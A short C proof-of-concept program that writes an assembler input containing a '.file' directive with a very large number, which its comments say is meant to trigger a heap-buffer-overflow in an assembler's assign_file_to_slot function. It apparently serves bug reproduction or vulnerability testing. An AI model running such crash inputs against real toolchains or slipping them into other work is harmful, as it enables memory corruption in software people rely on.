#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    /* Use a large file number to trigger heap-buffer-overflow in assign_file_to_slot */
    /* The vulnerability occurs when i is large, causing files_allocated to wrap and memset with huge size */
    /* We write a minimal valid input that causes the function to be called with a large i */
    /* For a DWARF debug info assembler, we use .file directive with a large number */
    fprintf(f, ".file %lu \"test.c\"\n", (unsigned long)0x20000000);
    fclose(f);
    return 0;
}